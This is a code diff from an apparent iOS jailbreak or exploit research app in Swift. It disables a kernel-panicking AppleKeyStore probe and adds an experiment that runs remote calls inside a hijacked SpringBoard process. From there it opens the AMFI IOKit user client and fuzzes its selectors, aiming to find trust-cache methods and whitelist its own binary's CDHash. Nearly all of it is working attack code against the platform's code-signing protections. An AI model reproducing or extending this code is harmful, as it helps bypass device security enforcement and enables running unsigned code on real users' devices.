@@ -499,11 +499,22 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp56)
             
             // ============================================
-            // 🔥🔥 Experiment 57: AppleKeyStore external methods
-            // KeyStore has known vulns in older iOS — test selectors
+            // 🔥🔥 Experiment 57: AppleKeyStore — DISABLED (causes panic)
+            // All 20 selectors active but triggers panic after completion
             // ============================================
-            let exp57 = self.expKeyStoreProbe()
-            experimentResults.append(exp57)
+            experimentResults.append(ExperimentResult(
+                name: "🔥🔥 KeyStore (DISABLED)",
+                success: true,
+                detail: "Previous: 20 active methods found (0-19)\nSelectors 0,1,16 return SUCCESS with no input\nDisabled to prevent panic — revisit after AMFI research",
+                timestamp: Date()
+            ))
+            
+            // ============================================
+            // 🔥🔥🔥🔥 Experiment 58: AMFI Struct Method Deep Probe
+            // AMFI selectors need struct input — try CDHash, PID, flags
+            // ============================================
+            let exp58 = self.expAMFIStructProbe()
+            experimentResults.append(exp58)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -3806,6 +3817,235 @@ struct AMFIExperimentView: View {
         detail += "- Manipulate trust anchors\n"
         
         return ExperimentResult(name: "🔥🔥 KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - 🔥🔥🔥🔥 AMFI Struct Method Deep Probe
+    
+    /// Experiment 58: AMFI methods need struct input — probe with various struct formats
+    /// Known AMFI IOKit methods typically accept:
+    /// - CDHash (20 bytes SHA1 or 32 bytes SHA256) for binary whitelisting
+    /// - PID (4 bytes) for process-specific operations
+    /// - Entitlement queries (string + PID)
+    /// - Trust cache entries (CDHash + flags)
+    ///
+    /// We try different struct sizes and content to find what each selector expects
+    private func expAMFIStructProbe() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        var detail = "AMFI Struct Method Deep Probe\n\n"
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
+        let ioConnectCallStruct = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallStructMethod"))
+        
+        guard ioConnectCallStruct != 0 else {
+            detail += "IOConnectCallStructMethod not available\n"
+            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Re-open AMFI user client
+        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
+        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
+        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
+        
+        guard svc != 0 else {
+            detail += "AMFI service not found\n"
+            RootExecutor.rcall(sb, "free", nameAddr)
+            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+        let connectAddr = mem + 0x1A00
+        sb[connectAddr].setValue32(0)
+        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
+        let connect = sb[connectAddr].value32()
+        
+        guard openRet == 0 && connect != 0 else {
+            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
+            RootExecutor.rcall(sb, "free", nameAddr)
+            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
+        }
+        
+        detail += "✅ AMFI opened: connect=\(connect)\n\n"
+        
+        // IOConnectCallStructMethod(connect, selector, inputStruct, inputSize, outputStruct, &outputSize)
+        // 6 params — safe for ARM64
+        
+        let structInAddr = mem + 0x2200   // input struct buffer (256 bytes)
+        let structOutAddr = mem + 0x2400  // output struct buffer (256 bytes)
+        let structOutSizeAddr = mem + 0x2600
+        
+        // Active selectors from exp 56: [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
+        // Test selector 2 first (likely the most basic method)
+        
+        var foundWorking: [(Int, String)] = []
+        
+        // Strategy 1: Try each active selector with different struct sizes
+        // AMFI methods typically expect specific struct sizes
+        let testSelectors = [2, 4, 5, 9, 11, 12]  // subset to avoid panic
+        let testSizes: [UInt64] = [4, 8, 20, 24, 32, 40, 48, 64]
+        
+        detail += "--- Testing struct input sizes ---\n"
+        
+        for selector in testSelectors.prefix(4) {  // limit to 4 selectors
+            detail += "\nSelector \(selector):\n"
+            
+            for size in testSizes {
+                // Zero-fill input struct
+                for i in 0..<Int(size / 8 + 1) {
+                    sb[structInAddr + UInt64(i * 8)].setValue64(0)
+                }
+                
+                // Set output size
+                sb[structOutSizeAddr].setValue64(256)
+                
+                // Clear output
+                for i in 0..<32 {
+                    sb[structOutAddr + UInt64(i * 8)].setValue64(0)
+                }
+                
+                // IOConnectCallStructMethod(connect, selector, input, inputSize, output, &outputSize)
+                let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
+                                             UInt64(connect),
+                                             UInt64(selector),
+                                             structInAddr, size,
+                                             structOutAddr, structOutSizeAddr)
+                
+                let outSize = sb[structOutSizeAddr].value64()
+                
+                if ret == 0 {
+                    detail += "  ✅ size=\(size): SUCCESS! outSize=\(outSize)\n"
+                    foundWorking.append((selector, "struct_size=\(size)"))
+                    
+                    // Read output
+                    if outSize > 0 && outSize <= 64 {
+                        var outBuf = [UInt8](repeating: 0, count: Int(outSize))
+                        sb.remoteRead(structOutAddr, to: &outBuf, size: outSize)
+                        let hex = outBuf.prefix(24).map { String(format: "%02x", $0) }.joined(separator: " ")
+                        detail += "    output: \(hex)\n"
+                    }
+                    break  // found working size for this selector
+                } else if ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe00002bc {
+                    // Different error — interesting!
+                    detail += "  ⚠️ size=\(size): ret=0x\(String(format: "%x", ret))\n"
+                }
+            }
+        }
+        
+        // Strategy 2: Try selector 2 with PID as input (4 bytes)
+        // AMFI might have a "check process" method
+        detail += "\n--- Selector 2 with PID input ---\n"
+        sb[structInAddr].setValue32(1)  // PID 1 = launchd
+        sb[structOutSizeAddr].setValue64(256)
+        let pidRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
+                                         UInt64(connect), 2,
+                                         structInAddr, 4,
+                                         structOutAddr, structOutSizeAddr)
+        let pidOutSize = sb[structOutSizeAddr].value64()
+        detail += "  PID=1: ret=0x\(String(format: "%x", pidRet)), outSize=\(pidOutSize)\n"
+        if pidRet == 0 && pidOutSize > 0 {
+            var outBuf = [UInt8](repeating: 0, count: min(Int(pidOutSize), 32))
+            sb.remoteRead(structOutAddr, to: &outBuf, size: UInt64(outBuf.count))
+            detail += "  output: \(outBuf.map { String(format: "%02x", $0) }.joined(separator: " "))\n"
+            foundWorking.append((2, "PID input"))
+        }
+        
+        // Strategy 3: Try selector 5 with CDHash-like input (20 bytes = SHA1)
+        // This might be "add to trust cache" or "check CDHash"
+        detail += "\n--- Selector 5 with CDHash input (20B zeros) ---\n"
+        for i in 0..<3 { sb[structInAddr + UInt64(i * 8)].setValue64(0) }
+        sb[structOutSizeAddr].setValue64(256)
+        let cdRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
+                                        UInt64(connect), 5,
+                                        structInAddr, 20,
+                                        structOutAddr, structOutSizeAddr)
+        let cdOutSize = sb[structOutSizeAddr].value64()
+        detail += "  ret=0x\(String(format: "%x", cdRet)), outSize=\(cdOutSize)\n"
+        if cdRet == 0 {
+            detail += "  ✅ CDHash-sized input ACCEPTED!\n"
+            foundWorking.append((5, "CDHash input"))
+        }
+        
+        // Strategy 4: Try with scalar+struct combo via IOConnectCallMethod workaround
+        // Some methods need BOTH scalar and struct input
+        // Use IOConnectCallScalarMethod with scalar[0] = selector-specific value
+        detail += "\n--- Selector 9 with 2 scalar inputs ---\n"
+        let scalarInAddr = mem + 0x2800
+        sb[scalarInAddr].setValue64(1)       // arg0 = PID?
+        sb[scalarInAddr + 8].setValue64(0)   // arg1 = flags?
+        let scalarOutAddr = mem + 0x2A00
+        let scalarOutCntAddr = mem + 0x2C00
+        sb[scalarOutCntAddr].setValue32(16)
+        let s9ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                        UInt64(connect), 9,
+                                        scalarInAddr, 2,
+                                        scalarOutAddr, scalarOutCntAddr)
+        let s9out = sb[scalarOutCntAddr].value32()
+        detail += "  2 scalars [1,0]: ret=0x\(String(format: "%x", s9ret)), outCnt=\(s9out)\n"
+        if s9ret == 0 {
+            let val = sb[scalarOutAddr].value64()
+            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
+            foundWorking.append((9, "2 scalar inputs"))
+        }
+        
+        // Strategy 5: Try selector 2 with 2 scalars (PID + operation)
+        detail += "\n--- Selector 2 with 2 scalar inputs ---\n"
+        sb[scalarInAddr].setValue64(1)       // PID 1
+        sb[scalarInAddr + 8].setValue64(0)   // operation 0
+        sb[scalarOutCntAddr].setValue32(16)
+        let s2ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                        UInt64(connect), 2,
+                                        scalarInAddr, 2,
+                                        scalarOutAddr, scalarOutCntAddr)
+        let s2out = sb[scalarOutCntAddr].value32()
+        detail += "  [PID=1, op=0]: ret=0x\(String(format: "%x", s2ret)), outCnt=\(s2out)\n"
+        if s2ret == 0 {
+            let val = sb[scalarOutAddr].value64()
+            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
+            foundWorking.append((2, "2 scalar [PID,op]"))
+        }
+        
+        // Strategy 6: Try selector 4 with 3 scalars
+        detail += "\n--- Selector 4 with 3 scalar inputs ---\n"
+        sb[scalarInAddr].setValue64(1)       // PID
+        sb[scalarInAddr + 8].setValue64(0)   // flags
+        sb[scalarInAddr + 16].setValue64(0)  // extra
+        sb[scalarOutCntAddr].setValue32(16)
+        let s4ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                        UInt64(connect), 4,
+                                        scalarInAddr, 3,
+                                        scalarOutAddr, scalarOutCntAddr)
+        let s4out = sb[scalarOutCntAddr].value32()
+        detail += "  [1,0,0]: ret=0x\(String(format: "%x", s4ret)), outCnt=\(s4out)\n"
+        if s4ret == 0 {
+            let val = sb[scalarOutAddr].value64()
+            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
+            foundWorking.append((4, "3 scalar inputs"))
+        }
+        
+        // Close AMFI
+        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
+        RootExecutor.rcall(sb, "free", nameAddr)
+        
+        detail += "\n--- RESULTS ---\n"
+        detail += "Working combinations: \(foundWorking.count)\n"
+        for (sel, desc) in foundWorking {
+            detail += "  Selector \(sel): \(desc)\n"
+        }
+        if foundWorking.isEmpty {
+            detail += "No working combination found yet.\n"
+            detail += "Methods might need specific entitlement or token.\n"
+            detail += "NEXT: try with 4,5,6 scalar inputs or larger structs\n"
+        } else {
+            detail += "\n🔥 FOUND WORKING AMFI METHODS!\n"
+            detail += "Next: determine what each method DOES\n"
+            detail += "Try: pass our binary's CDHash to whitelist it\n"
+        }
+        
+        return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: !foundWorking.isEmpty, detail: detail, timestamp: Date())
     }
     
     /// IOSurface from SpringBoard — SB has IOSurface entitlement!
